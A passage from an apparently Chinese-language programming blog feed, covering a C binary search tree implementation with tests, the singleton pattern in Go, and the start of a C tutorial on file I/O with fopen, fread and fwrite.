&#123;  </span><br><span class="line">            parent-&gt;left = <span class="literal">NULL</span>;  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            parent-&gt;right = <span class="literal">NULL</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="built_in">free</span>(p);  </span><br><span class="line">        T-&gt;size--;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* case 2: p has only one child */</span>  </span><br><span class="line">    <span class="keyword">if</span> (p-&gt;left == <span class="literal">NULL</span> || p-&gt;right == <span class="literal">NULL</span>) &#123;  </span><br><span class="line">        TreeNode *child = p-&gt;left != <span class="literal">NULL</span> ? p-&gt;left : p-&gt;right;  </span><br><span class="line">        <span class="keyword">if</span> (parent == <span class="literal">NULL</span>) &#123;  </span><br><span class="line">            T-&gt;root = child; <span class="comment">// the tree becomes a single node  </span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (parent-&gt;left == p) &#123;  </span><br><span class="line">            parent-&gt;left = child;  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            parent-&gt;right = child;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="built_in">free</span>(p);  </span><br><span class="line">        T-&gt;size--;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* case 3: p has two children */</span>  </span><br><span class="line">    TreeNode *q = p-&gt;right;  </span><br><span class="line">    TreeNode *q_parent = p;  </span><br><span class="line">    <span class="comment">// find the smallest node in the right subtree of p  </span></span><br><span class="line">    <span class="keyword">while</span> (q-&gt;left != <span class="literal">NULL</span>) &#123;  </span><br><span class="line">        q_parent = q;  </span><br><span class="line">        q = q-&gt;left;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="comment">// replace p with q  </span></span><br><span class="line">    p-&gt;value = q-&gt;value;  </span><br><span class="line">    <span class="comment">// delete q,q is a leaf node or has only one child---its right child  </span></span><br><span class="line">    <span class="comment">// In effect, the question is shifted to deleting a node with no left child    // It doesn&#x27;t really matter here q-&gt;right is NULL or not    if (q_parent-&gt;left == q) &#123;  </span></span><br><span class="line">        q_parent-&gt;left = q-&gt;right;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        q_parent-&gt;right = q-&gt;right;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="built_in">free</span>(q);  </span><br><span class="line">    T-&gt;size--;  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="type">bool</span> <span class="title function_">find</span><span class="params">(BSTree T, TreeElementType key)</span> &#123;  </span><br><span class="line">    TreeNode *p = T-&gt;root;  </span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">NULL</span>) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (key &lt; p-&gt;value) &#123;  </span><br><span class="line">            p = p-&gt;left;  </span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (key &gt; p-&gt;value) &#123;  </span><br><span class="line">            p = p-&gt;right;  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试main.c:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;BSTree.h&quot;</span>  </span></span><br><span class="line">  </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="type">int</span> nums[] = &#123;<span class="number">5</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">9</span>&#125;;  </span><br><span class="line">    BSTree T = newBSTree();  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// test insert()  </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;insert 10 numbers into BSTree\n&quot;</span>);  </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;  </span><br><span class="line">        insert(T, nums[i]);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size: %d\n&quot;</span>, treeSize(T));  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// test findMin() and findMax()  </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;min: %d\n&quot;</span>, findMin(T));  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;max: %d\n&quot;</span>, findMax(T));  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// test find()  </span></span><br><span class="line">    <span class="type">int</span> key = <span class="number">10</span>;  </span><br><span class="line">    <span class="keyword">if</span> (find(T, key)) &#123;  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;find %d\n&quot;</span>, key);  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;not find %d\n&quot;</span>, key);  </span><br><span class="line">    &#125;  </span><br><span class="line">    key = <span class="number">5</span>;  </span><br><span class="line">    <span class="keyword">if</span> (find(T, key)) &#123;  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;find %d\n&quot;</span>, key);  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;not find %d\n&quot;</span>, key);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// test isEmptyTree()  </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size: %d\n&quot;</span>, treeSize(T));  </span><br><span class="line">    <span class="keyword">while</span> (!isEmptyTree(T)) &#123;  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, findMin(T));  </span><br><span class="line">        delete(T, findMin(T));  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nsize: %d\n&quot;</span>, treeSize(T));  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// test destroyBSTree()  </span></span><br><span class="line">    destroyBSTree(T);  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ ./ADT_BinaryTree.exe</span><br><span class="line">insert 10 numbers into BSTree</span><br><span class="line">size: 10</span><br><span class="line">min: 0</span><br><span class="line">max: 9</span><br><span class="line">not find 10</span><br><span class="line">find 5</span><br><span class="line">size: 10</span><br><span class="line">0 1 2 3 4 5 6 7 8 9 </span><br><span class="line">size: 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
            <tag> 二叉搜索树 </tag>
            
            <tag> 二叉树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>单例模式</title>
      <link href="/2024c7cb4fe9e6d6/"/>
      <url>/2024c7cb4fe9e6d6/</url>
      
        <content type="html"><![CDATA[<h1 id="概述">概述</h1><p><code>单例模式</code>是最简单的设计模式之一，属于创建型模式。该模式确保<code>单例类</code>（在当前进程中）只有一个实例。</p><p>在系统中，有些数据只应该保存一份，这些数据就应该设计为单例类。例如一个系统的配置数据，使用一个单例对象来访问即可。</p><p>单例模式通常需要满足如下条件：</p><ol><li>类的构造方法为私有，即不允许其他代码实例化该类，以保证实例的唯一性。</li><li>类应该提供一个公共的静态方法来为其他代码提供该实例。</li><li>其他代码只能通过访问该类的静态方法来获取该类的唯一实例。该静态方法在未创建单例时进行创建，如果已经创建，则返回该单例（引用、指针）。</li></ol><h1 id="实现方式">实现方式</h1><h2 id="饿汉式">饿汉式</h2><p>饿汉式，即在加载类的时候就直接创建出类的实例，对外只暴露静态方法。</p><p>该模式使用golang实现时，利用包的init函数实现比较方便。典型的例子就是创建数据库连接实例的时候，会利用init进行初始化。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> singleton</span><br><span class="line"></span><br><span class="line"><span class="comment">// 单例类</span></span><br><span class="line"><span class="keyword">type</span> Singleton <span class="keyword">struct</span> &#123;</span><br><span class="line">s <span class="type">string</span> <span class="comment">// 以string举例</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 非导出的指针指向类的实例</span></span><br><span class="line"><span class="keyword">var</span> singleton *Singleton</span><br><span class="line"></span><br><span class="line"><span class="comment">// init 创建单例</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">singleton = &amp;Singleton&#123;s: <span class="string">&quot;test&quot;</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// GetInstance 获取实例</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetInstance</span><span class="params">()</span></span> *Singleton &#123;</span><br><span class="line"><span class="keyword">return</span> singleton</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> singleton  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;testing&quot;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestGetInstance</span><span class="params">(t *testing.T)</span></span> &#123;  </span><br><span class="line">    <span class="keyword">if</span> GetInstance() != GetInstance() &#123;  </span><br><span class="line">       t.Error(<span class="string">&quot;Singleton instance is not unique&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>优点:</p><ol><li>实现简单，在类加载（导入包）的时候就完成实例化，避免线程同步问题。</li></ol><p>缺点：</p><ol><li>未实现 Lazy 初始化。</li><li>容易产生垃圾对象，若该实例从未被使用，会造成内存浪费。</li></ol><h2 id="懒汉式">懒汉式</h2><p>懒汉式，即在在需要调用实例的时候再对类实例化。<br>为了保证并发安全，需要加锁，但是同时会大大降低效率。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> singleton  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;sync&quot;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">var</span> (  </span><br><span class="line">    lazySingleton *Singleton  </span><br><span class="line">    once          sync.Once  </span><br><span class="line">)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// GetLazySingleton 懒汉式单例模式  </span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetLazySingleton</span><span class="params">()</span></span> *Singleton &#123;  </span><br><span class="line">    <span class="comment">// once.Do 只会在 lazySingleton 为 nil 时执行一次  </span></span><br><span class="line">    once.Do(<span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;  </span><br><span class="line">       lazySingleton = &amp;Singleton&#123;&#125;  </span><br><span class="line">    &#125;)  </span><br><span class="line">    <span class="keyword">return</span> lazySingleton  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> singleton  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;testing&quot;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestGetLazySingleton</span><span class="params">(t *testing.T)</span></span> &#123;  </span><br><span class="line">    <span class="keyword">if</span> GetLazySingleton() != GetLazySingleton() &#123;  </span><br><span class="line">       t.Error(<span class="string">&quot;Lazy singleton instance is not unique&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>优点:</p><ol><li>实现 Lazy 初始化。</li></ol><p>缺点：</p><ol><li>需要加锁以保证并发安全，导致效率降低。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 设计模式 </tag>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-16_1-文件与文件操作</title>
      <link href="/2024ec7d71d5adb8/"/>
      <url>/2024ec7d71d5adb8/</url>
      
        <content type="html"><![CDATA[<p>前置知识:</p><ul><li>指针</li><li>字符串</li></ul><h1 id="文件i-o流">文件I/O流</h1><p>在<code>3_2</code>章提到<code>流</code>的概念，文件流就是将磁盘中的文件读写抽象成了流。<br>文件流可以分为2类，一类是常规的文本流，其中的数据是供人阅读的文本；<br>另一类就是二进制流，其中的数据供程序读取使用。</p><p>我们这里学习标准C读写文件的方法，在打开文件的时候，可以选择使用<code>文本模式</code>还是<code>二进制模式</code>进行读写，两者差异其实并不大，一般仅体现在换行符的处理上。</p><h1 id="打开文件">打开文件</h1><h2 id="file类型">FILE类型</h2><p>首先，在打开一个文件之后，我们势必需要使用某种对象来代表这个文件，并进行读写操作，亦即需要使用某个对象来保持文件的打开状态。</p><p>C语言使用 <code>FILE</code>类型实现该功能，它是一个结构体，定义在<code>stdio.h</code>中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">iobuf</span> &#123;</span>  </span><br><span class="line"><span class="type">char</span> *_ptr;  </span><br><span class="line"><span class="type">int</span>   _cnt;  </span><br><span class="line"><span class="type">char</span> *_base;  </span><br><span class="line"><span class="type">int</span>   _flag;  </span><br><span class="line"><span class="type">int</span>   _file;  </span><br><span class="line"><span class="type">int</span>   _charbuf;  </span><br><span class="line"><span class="type">int</span>   _bufsiz;  </span><br><span class="line"><span class="type">char</span> *_tmpfname;  </span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">iobuf</span> <span class="title">FILE</span>;</span></span><br></pre></td></tr></table></figure><p>我们无需记忆该结构体的实现细节，对外而言，只需要使用一个<code>FILE*</code>即可记录一个文件的状态，即使用一个指向<code>FILE</code>类型的指针来持有一个文件。</p><p>在打开一个文件后，后续的读写操作均围绕该<code>FILE*</code>变量展开即可，均封装在C标准提供的若干函数中。</p><h2 id="fopen函数">fopen函数</h2><p>打开一个文件对象（亦即<code>FILE *</code>指针指向的对象）需要2个信息：</p><ul><li>文件路径：文件路径包括了文件名，分为2类，一类是绝对路径，另一类是相对路径</li><li>文件访问标记：以何种模式打开文件，包括是否可写、文本模式、追加还是从头开始等</li></ul><p>C标准提供了<code>fopen</code>函数来打开文件，上述两个信息作为2个字符串参数进行提供：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FILE *<span class="title function_">fopen</span><span class="params">( <span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode )</span>; <span class="comment">// C99前</span></span><br><span class="line">FILE *<span class="title function_">fopen</span><span class="params">( <span class="type">const</span> <span class="type">char</span> *<span class="keyword">restrict</span> filename, <span class="type">const</span> <span class="type">char</span> *<span class="keyword">restrict</span> mode )</span>; <span class="comment">// C99起</span></span><br></pre></td></tr></table></figure><p>若成功，返回指向新文件流的指针；错误时，返回空指针NULL。</p><h3 id="文件路径">文件路径</h3><p>其中，<code>filename</code>是一个字符指针，指向了要打开的文件路径字符串，有2种方式：</p><ul><li>绝对路径：即从根目录开始写起的路径，可以直接唯一定位文件，例如：<ul><li>Linux下：<code>&quot;/home/username/C/test.txt&quot;</code></li><li>Windows下：<code>&quot;D:/data/code/C/test.txt&quot;</code></li></ul></li><li>相对路径：并非从根目录开始写起，而是以工作路径为基础，在其之上进行相对定位的路径，例如：<ul><li>Linux下：<code>test.txt</code>，此时如果工作路径是<code>/home/username/C/</code>，则文件的实际路径为<code>&quot;/home/username/C/test.txt&quot;</code></li><li>Windows下：<code>&quot;./C/text.txt&quot;</code>，此时如果工作路径是<code>&quot;D:/data/code/&quot;</code>，则文件的实际路径为<code>&quot;D:/data/code/C/test.txt&quot;</code></li><li>工作路径：工作路径是程序在执行时所处的路径，一般情况下是程序可执行文件所在的路径</li></ul></li></ul><h3 id="文件访问标记">文件访问标记</h3><p><code>mode</code>（文件访问标记）同样是一个字符指针，指向了表示文件访问标记的字符串，fopen使用如下几种访问标记：</p><table><thead><tr><th>文件访问模式字符串</th><th>含义</th><th>解释</th><th>若文件已存在的动作</th><th>若文件不存在的动作</th></tr></thead><tbody><tr><td>“r”</td><td>读</td><td>打开文件以读取</td><td>从头读</td><td>打开失败</td></tr><tr><td>“w”</td><td>写</td><td>创建文件以写入</td><td>销毁内容</td><td>创建新文件</td></tr><tr><td>“a”</td><td>追加</td><td>追加到文件</td><td>写到结尾</td><td>创建新文件</td></tr><tr><td>“r+”</td><td>读扩展</td><td>打开文件以读/写</td><td>从头读</td><td>错误</td></tr><tr><td>“w+”</td><td>写扩展</td><td>创建文件以读/写</td><td>销毁内容</td><td>创建新文件</td></tr><tr><td>“a+”</td><td>追加扩展</td><td>打开文件以读/写</td><td>写到结尾</td><td>创建新文件</td></tr></tbody></table><p>如果模式不是以上所列字符串之一，则其行为未定义，不过一些实现会定义额外支持的模式（例如Windows）<br>此外，在上述模式的基础上可以加上<code>&quot;b&quot;</code>标记来以二进制模式打开文件，例如<code>&quot;rb&quot;、&quot;wb+&quot;</code>等，该标记在POSIX上无效果，而在Windows上会禁用换行符的特殊处理（如下“两种读写模式的区别”所述）。</p><h3 id="两种读写模式的区别">两种读写模式的区别</h3><p>现在来解释<code>文本模式</code>和<code>二进制模式</code>的区别。</p><h4 id="两种操作系统的换行符区别">两种操作系统的换行符区别</h4><p>首先需要了解Linux和Windows的换行符区别。</p><ul><li>Linux下的文件换行符就是一个<code>\n</code>即可（即<code>0x0a</code>），也就是所谓的<code>LF</code>；</li><li>而Windows下则是两个字符<code>\r\n</code>代表换行，如果以十六进制表示就是<code>0x0d0x0a</code>，也就是所谓的<code>CRLF</code></li></ul><p>Windows的CRLF占用2个字节，在文本模式时需要进行转换。</p><h4 id="文本模式和二进制模式">文本模式和二进制模式</h4><p>文本模式这样处理数据：</p><ul><li>写入文件时，将缓冲区中的<code>\n</code>转换为<code>\r\n</code>再写入文件</li><li>从文件读取时，将文件中的<code>\r\n</code>转换为<code>\n</code>，再写入缓冲区<br>而二进制模式则将<code>\r\n</code>视为普通的两个字节，不进行转换，直接写入文件或缓冲区</li></ul><h2 id="打开文件举例">打开文件举例</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE *file;</span><br><span class="line">    <span class="type">char</span> filename[] = <span class="string">&quot;./example.txt&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 以只读模式打开文件</span></span><br><span class="line">    file = fopen(filename, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Error opening file&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取文件内容，后续讲解</span></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">256</span>];</span><br><span class="line">    <span class="keyword">while</span> (fgets(buffer, <span class="keyword">sizeof</span>(buffer), file)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, buffer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭文件流</span></span><br><span class="line">    fclose(file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="读写文件内容">读写文件内容</h1><p>读写文件有若干函数可以选择，分为“直接读写文件”、“无格式输入/输出”、“有格式输入/输出”</p><h2 id="直接读写文件">直接读写文件</h2><h3 id="fread函数-从文件读取若干数据">fread函数-从文件读取若干数据</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">fread</span><span class="params">(<span class="type">void</span> *buffer, <span class="type">size_t</span> size, <span class="type">size_t</span> count,FILE * stream)</span>;</span><br></pre></td></tr></table></figure><p><code>fread</code>函数从输入流 <code>stream</code> 读取至多 <code>count</code> 个对象到数组 <code>buffer</code> 中，每个对象的大小是 <code>size</code> 个字节。<br>其中：</p><ul><li>buffer：指向要读取的数组中首个对象的指针，或者说目的数组/缓冲区</li><li>size：要读取的每个对象的大小，例如读取若干个int对象，size的值就是 <code>sizeof(int)</code></li><li>count：要读取的对象数，例如读取4个int对象，count的值就是4</li><li>stream：读取来源的输入文件流，即从哪个文件读取</li><li>返回值：成功读取的对象数，若出现错误或文件尾条件，则可能小于 <code>count</code></li></ul><p>例如从文件中读取10个字符到buffer中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE *file;</span><br><span class="line">    <span class="type">char</span> filename[] = <span class="string">&quot;./example.txt&quot;</span>; <span class="comment">// 要读取的文件名</span></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">11</span>]; <span class="comment">// 缓冲区，需要额外一个字符的空间来存储字符串的结束符 &#x27;\0&#x27;</span></span><br><span class="line">    <span class="type">size_t</span> result;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 以只读模式打开文件</span></span><br><span class="line">    file = fopen(filename, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Error opening file&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用fread()从文件中读取10个字符到buffer中</span></span><br><span class="line">    result = fread(buffer, <span class="keyword">sizeof</span>(<span class="type">char</span>), <span class="number">10</span>, file);</span><br><span class="line">    <span class="comment">// 这里为了简洁期间，省略错误检查的代码</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加字符串结束符</span></span><br><span class="line">    buffer[result] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Read from file: %s\n&quot;</span>, buffer);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭文件</span></span><br><span class="line">    fclose(file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="fwrite函数-向文件写入若干数据">fwrite函数-向文件写入若干数据</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">fwrite</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *buffer, <span class="type">size_t</span> size, <span class="type">size_t</span> count, FILE * stream)</span>;</span><br></pre></td></tr></table></figure><p><code>fwrite</code>函数从数组 <code>buffer</code> 写入 <code>count</code> 个对象到输出流 <code>stream</code> 中，每个对象的大小是 <code>size</code> 个字节。</p><p>其中：</p><ul><li>buffer：指向数组中要被写入的首个对象的指针，或者说源数组/缓冲区</li><li>size：要写入的每个对象的大小，例如写入若干个int对象，size的值就是 <code>sizeof(int)</code></li><li>count：要写入的对象数，例如写入4个int对象，count的值就是4</li><li>stream：写入目的的输出文件流，即向哪个文件写入</li><li>返回值：成功写入的对象数，若出现错误或文件尾条件，则可能小于 <code>count</code></li></ul><p>例如将buffer中的字符串写入到文件中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 